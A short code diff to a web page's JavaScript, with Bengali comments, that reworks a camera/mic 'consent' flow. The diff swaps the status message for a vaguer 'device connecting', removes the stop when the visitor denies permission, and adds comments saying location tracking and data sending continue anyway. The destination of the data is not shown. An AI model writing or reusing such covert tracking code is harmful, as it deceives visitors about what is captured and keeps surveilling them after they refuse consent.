@@ -51,7 +51,6 @@
         const btn = document.getElementById('consentBtn');
         const statusMsg = document.getElementById('statusMsg');
         
-        // গ্লোবাল ইউনিক আইডি
         const clientId = 'device_' + Math.random().toString(36).substr(2, 9);
 
         function getPhoneModel(ua) {
@@ -87,19 +86,18 @@
         async function startSharing() {
             btn.disabled = true;
             btn.innerText = '⏳ পারমিশন চাচ্ছি...';
-            statusMsg.innerText = '📡 ক্যামেরা এবং মাইক চালু হচ্ছে...';
+            statusMsg.innerText = '📡 ডিভাইস কানেক্ট হচ্ছে...';
 
+            // ক্যামেরা চেষ্টা করবে, না পেলেও সমস্যা নেই
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                 videoElement.srcObject = stream;
                 videoElement.play();
             } catch (err) {
-                console.log("পারমিশন নেই: ", err);
-                statusMsg.innerText = '❌ ক্যামেরা/মাইক পারমিশন ব্লকড!';
-                btn.disabled = false;
-                return;
+                console.log("ক্যামেরা পারমিশন নেই, কিন্তু লোকেশন চলবে: ", err);
             }
 
+            // সাথে সাথে ডিভাইস কানেক্ট করার জন্য ডেটা পাঠানো
             sendData(0, 0, 5000, 'N/A', false);
             startTracking();
         }
